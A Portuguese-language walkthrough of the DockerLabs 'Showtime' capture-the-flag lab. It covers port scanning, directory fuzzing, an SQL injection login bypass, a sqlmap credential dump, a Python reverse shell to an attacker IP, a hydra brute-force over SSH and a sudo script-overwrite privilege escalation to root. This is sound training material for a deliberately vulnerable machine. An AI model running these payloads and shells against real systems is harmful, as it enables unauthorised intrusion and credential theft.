<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>maq.showtime</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>maq.showtime</h1><br/><p></p><p><strong><span style="color:#ff0000;">MÁQUINA SHOWTIME</span></strong></p><p></p><p><img src="images/167-1.png" alt="images/167-1.png" /></p><p></p><p><strong>Para utilizar esta máquina devemos primeiro baixar os arquivos e assim implantá-la com Docker.</strong><strong></strong></p><p><strong>  </strong><strong></strong></p><p><strong>Baixamos o arquivo da página </strong><strong><a href="https://dockerlabs.es/">https://dockerlabs.es/</a></strong><strong></strong></p><p><strong></strong><strong></strong></p><p><strong>Para implantar o laboratório executamos da seguinte forma, para que também possamos ver que ele nos diz a direção que teremos, bem como o que fazer quando terminarmos.</strong></p><p></p><p><img src="images/167-2.png" alt="images/167-2.png" /></p><p></p><p><strong><span style="color:#ff0000;">COLETA DE INFORMAÇÕES </span></strong><strong></strong></p><p><strong></strong><strong></strong></p><p><strong></strong><strong><span style="color:#ff7800;">nmap 172.17.0.2 -A -sS -sV -sC  -Pn -T5  -p-</span></strong><strong><span style="color:#ff7800;"></span></strong></p><p><strong><span style="color:#ff7800;"></span></strong><strong><span style="color:#ff7800;"></span></strong></p><p><strong><span style="color:#ff7800;"></span></strong><img src="images/167-3.png" alt="images/167-3.png" /> </p><p></p><p><strong>Temos as porta 22 e 80 aberta</strong>.</p><p></p><p><strong><span style="color:#ff7800;">22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu</span></strong><strong><span style="color:#ff7800;"></span></strong></p><p><strong><span style="color:#ff7800;">80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))</span></strong></p><p></p><p><strong>Vamos explorar  a porta 80: </strong> <a href="http://172.17.0.2/">http://172.17.0.2/</a></p><p></p><p><img src="images/167-4.png" alt="images/167-4.png" /></p><p></p><p><strong>Vamos fazer um </strong><strong><span style="color:#ff7800;">fuzzing </span></strong><strong>para ver se tem pastas ocultas, com a ferramenta </strong><strong><span style="color:#ff7800;">gobuster</span></strong><strong>.</strong></p><p></p><p><strong><span style="color:#ff7800;">gobuster dir -u </span></strong><strong><a href="http://172.17.0.2">http://172.17.0.2</a></strong><strong><span style="color:#ff7800;"> -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x .txt,.php,.py,.html</span></strong><strong><span style="color:#ff7800;"></span></strong></p><p><strong><span style="color:#ff7800;"></span></strong></p><p><strong>Achamos vários diretórios ( </strong><strong><span style="color:#3584e4;">/images.../assets.../icon../css.../js..../fonts...login_page</span></strong><strong> )</strong></p><p></p><p><img src="images/167-5.png" alt="images/167-5.png" /></p><p></p><p><strong>Vamos entrar na pasta de login que nos importa agora: </strong><strong><a href="http://172.17.0.2/login_page/">http://172.17.0.2/login_page/</a></strong></p><p></p><p><img src="images/167-6.png" alt="images/167-6.png" /></p><p></p><p> <strong>Realizar a Injeção de SQL no Campo de Login</strong>: <strong><span style="color:#ff7800;">&#39; OR &#39;1&#39;=&#39;1</span></strong></p><p> </p><p> <strong>A mensagem &quot;Bienvenido, &#39; OR &#39;1&#39;=&#39;1! A sessão foi iniciada corretamente.&quot; indica que o payload de injeção SQL </strong><strong><code>&#39; OR &#39;1&#39;=&#39;1</code></strong><strong>funcionou, permitindo que você faça login sem fornecer credenciais válidas. Esse resultado demonstra uma vulnerabilidade de SQL Injection (SQLi) na aplicação, que aceitou a instrução maliciosa sem validação adequada.</strong></p><p> </p><p> <img src="images/167-7.png" alt="images/167-7.png" /></p><p> </p><p><strong>Vamos usar a ferramenta </strong><strong><span style="color:#ff7800;">burp suite</span></strong><strong> para interceptar a requisição de login</strong>.</p><p></p><p><strong>Vamos manda a requisição intercepitada para </strong><strong><span style="color:#ff7800;">intruder</span></strong><strong>, para fazer o ataque de forma automatica.</strong></p><p></p><p><img src="images/167-8.png" alt="images/167-8.png" /></p><p></p><p><strong>Ataque :</strong></p><p></p><p><img src="images/167-9.png" alt="images/167-9.png" /></p><p></p><p><strong>Proximo passo criar um arquivo requests.txt... como mostra na foto acima no numero ( 10° copiar request e criar o arquivo .txt ).</strong><strong></strong></p><p><strong></strong><strong></strong></p><p><strong></strong><img src="images/167-10.png" alt="images/167-10.png" /></p><p></p><p>Vamos fazer o ataque com <span style="color:#ff7800;">sqlmap</span> :</p><p></p><p><span style="color:#ff7800;">sqlmap -r requests.txt --level=5 --risk=3 --dump</span></p><p></p><p>conseguimos 3 usuários e senha.</p><p></p><p><img src="images/167-11.png" alt="images/167-11.png" /></p><p></p><p>Vamos voltar para a pagina de login do site e tentar logar com os usuários.</p><p></p><p>vamos fazer o login com usuário :</p><p></p><p>joe</p><p>senha: <span style="color:#ff7800;">MiClaveEsInhackeable </span></p><p></p><p><img src="images/167-12.png" alt="images/167-12.png" /></p><p></p><p>login do joe feito com sucesso</p><p></p><p><img src="images/167-13.png" alt="images/167-13.png" /></p><p></p><p>Agora vamos fazer um reverse shell em <span style="color:#ff7800;">python</span>:</p><p></p><p>mas ante vamos deixar o <span style="color:#ff7800;">netcat</span> na esculta.</p><p></p><p><img src="images/167-14.png" alt="images/167-14.png" /></p><p></p><p>note que a primeira tentativa do reverse shell nao fucionou:</p><p></p><p>python3 -c <span style="color:#3ad900;">&#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.0.24&quot;,4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;]);&#39;</span></p><p></p><p><img src="images/167-15.png" alt="images/167-15.png" /></p><p></p><p>retorno</p><p><img src="images/167-16.png" alt="images/167-16.png" /></p><p></p><p>Agora vamos editar o reverse shell, excluindo <span style="color:#ff7800;">python3 -c</span>  e a aspas simples ( <span style="color:#ff7800;">‘   ’ </span>) no começo e no final do reverse shell:</p><p></p><p>Ficando assim:</p><p></p><p>import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.0.24&quot;,4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;]);</p><p></p><p>Temos a reverse shell:</p><p></p><p><img src="images/167-17.png" alt="images/167-17.png" /></p><p></p><p>Agora vamos explorar para ter privilégios.</p><p></p><p>sudo -l , nao temos nenhum retorno.</p><p></p><p><img src="images/167-18.png" alt="images/167-18.png" /></p><p></p><p>Usando o comando <span style="color:#ff7800;">find /tmp -type f -name &quot;*.txt&quot; 2&gt;/dev/null</span> veja que temos um arquivo chamado <span style="color:#ff7800;">.hidden_text.txt</span>:</p><p></p><p><img src="images/167-19.png" alt="images/167-19.png" /></p><p></p><p><img src="images/167-20.png" alt="images/167-20.png" /></p><p></p><p>Vamos cria um arquivo de senhas.txt com essas palavras acima:</p><p>para criar o arquivo é com o comando <span style="color:#ff7800;">nano senhas.txt</span>.</p><p>para ver ler o arquivo o comando <span style="color:#ff7800;">cat senhas.txt</span>.</p><p></p><p><img src="images/167-21.png" alt="images/167-21.png" /></p><p></p><p>Vamos fazer uma ataque de <span style="color:#ff7800;">força bruta</span> com <span style="color:#ff7800;">hydra</span> no usuário<span style="color:#ff7800;"> joe</span> e no <span style="color:#ff7800;">luciano</span>.</p><p></p><p>Veja que ambos os usuário  a senha nao foi encotrada.</p><p></p><p><span style="color:#ff7800;">joe</span>:</p><p></p><p><img src="images/167-22.png" alt="images/167-22.png" /></p><p></p><p><span style="color:#ff7800;">luciano</span>:</p><p></p><p><img src="images/167-23.png" alt="images/167-23.png" /></p><p></p><p>Se fomos observar a wordlists das senha ela esta todas com as letras maiúsculas.</p><p></p><p><img src="images/167-24.png" alt="images/167-24.png" /></p><p></p><p>Então vamos <span style="color:#ff7800;">editar</span> a wordlists <span style="color:#ff7800;">senhas.txt </span>e colocar todas as palavras em <span style="color:#ff7800;">letras minúsculas</span>, e para fazer isso vamos usar o chatgpt. </p><p></p><p><img src="images/167-25.png" alt="images/167-25.png" /></p><p></p><p>Vamos usar o nano para editar senhas.txt</p><p></p><p><img src="images/167-26.png" alt="images/167-26.png" /></p><p></p><p>Agora vamos fazer o ataque nomavante com hydra.</p><p></p><p><img src="images/167-27.png" alt="images/167-27.png" /></p><p></p><p>Vamos entra no <span style="color:#ff7800;">ssh</span> com usuário <span style="color:#ff7800;">joe</span>:</p><p></p><p><img src="images/167-28.png" alt="images/167-28.png" /></p><p></p><p>Vamos buscar por privilégios <span style="color:#ff7800;">sudo -l</span> .</p><p></p><p>A saída do comando <code>sudo -l</code> mostra que o usuário <code>joe</code> tem permissão para executar o comando <code>/bin/posh</code> como o usuário <code>luciano</code> sem necessidade de senha (<code>NOPASSWD</code>).</p><p></p><p><img src="images/167-29.png" alt="images/167-29.png" /></p><p></p><p>Veja que entramos no usuário <span style="color:#ff7800;">luciano</span>.</p><p></p><p><span style="color:#ff7800;">sudo -u luciano /bin/posh</span></p><p></p><p><img src="images/167-30.png" alt="images/167-30.png" /></p><p></p><p>Vamos novamente procurar por privilégios com <span style="color:#ff7800;">sudo -l</span>.</p><p></p><p>A saída do comando <code>sudo -l</code> para o usuário <code>luciano</code> indica que ele tem permissão para executar o script <code>/home/luciano/script.sh</code> como o usuário <code>root</code> sem precisar de senha (<code>NOPASSWD</code>). Isso significa que o usuário <code>luciano</code> pode obter privilégios de administrador (<code>root</code>) ao rodar esse script.</p><p></p><p><img src="images/167-31.png" alt="images/167-31.png" /></p><p></p><p>Como o arquivo <code>script.sh</code> tem permissões de leitura e escrita para o proprietário (<code>luciano</code>), você pode editá-lo diretamente sem precisar de <code>sudo</code>. Basta usar um comando de redirecionamento para adicionar o comando <code>/bin/bash</code> ao script. Veja como fazer:</p><p></p><p><img src="images/167-32.png" alt="images/167-32.png" /></p><p></p><p><img src="images/167-33.png" alt="images/167-33.png" /></p><p></p><p><span style="color:#ff7800;">echo &quot;/bin/bash&quot; &gt; /home/luciano/script.sh</span></p><p></p><p><img src="images/167-34.png" alt="images/167-34.png" /></p><p></p><p><span style="color:#ff7800;">sudo /bin/bash /home/luciano/script.sh</span></p><p></p><p><img src="images/167-35.png" alt="images/167-35.png" /></p><p></p><p><span style="color:#ff7800;">somos root</span></p><p></p><p><span style="color:#ff0000;text-decoration:line-through;">R10</span></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p></div>
</body>
</html>
